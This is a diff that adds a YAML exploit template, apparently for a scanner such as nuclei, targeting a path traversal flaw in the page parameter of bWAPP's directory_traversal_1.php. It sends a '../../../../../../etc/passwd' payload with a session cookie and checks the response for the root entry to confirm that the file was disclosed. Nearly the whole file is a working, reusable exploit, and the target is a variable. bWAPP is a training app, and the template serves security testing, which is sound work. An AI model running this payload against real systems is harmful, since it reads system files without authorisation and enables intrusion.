@@ -1,0 +1,34 @@
+id: bwapp-directory-traversal
+info:
+  name: Directory Traversal / Path Traversal in directory_traversal_1.php page parameter
+  severity: high
+  description: >
+    The page parameter of directory_traversal_1.php is used to build a file path
+    without canonicalisation, so ../ sequences escape the intended directory and
+    disclose arbitrary files such as /etc/passwd.
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  cwe: CWE-22
+  tags: [path-traversal, lfi, disclosure]
+variables:
+  - name: target
+    required: true
+  - name: cookie
+    required: true
+  - name: payload
+    default: "../../../../../../etc/passwd"
+steps:
+  - http:
+      method: GET
+      url: "{{target}}/directory_traversal_1.php?page={{url_encode(payload)}}"
+      headers:
+        Cookie: "{{cookie}}"
+      matchers:
+        - type: regex
+          part: body
+          regex: "root:.*:0:0:"
+success:
+  all:
+    - type: regex
+      part: body
+      regex: "root:.*:0:0:"
